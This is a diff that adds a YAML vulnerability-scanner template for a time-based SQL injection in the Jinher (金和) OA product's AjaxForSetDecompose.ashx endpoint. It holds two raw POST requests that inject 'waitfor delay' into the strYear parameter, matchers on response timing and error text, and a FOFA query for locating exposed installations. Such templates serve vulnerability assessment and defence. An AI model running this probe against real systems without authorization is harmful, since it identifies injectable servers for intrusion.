@@ -1,0 +1,46 @@
+id: poc-yaml-jinher-jhsoft-ajaxforsetdecompose-ashx-sqli
+info:
+  name: "金和OA AjaxForSetDecompose.ashx SQL注入"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 金和OA
+  metadata:
+    product: 金和OA
+    fofa-query: app="金和网络-金和OA"
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForSetDecompose.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        strType=getDetpCollect&strYear=1;waitfor+delay%270:0:5%27--
+      - |
+        POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForSetDecompose.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        strType=getDetpCollect&strYear=1;waitfor+delay%270:0:8%27--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "未能找到路径"
+        part: body
+      - type: word
+        words:
+          - "JHSoft"
+        part: body
+      - type: word
+        words:
+          - "System.IO"
+        part: body
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
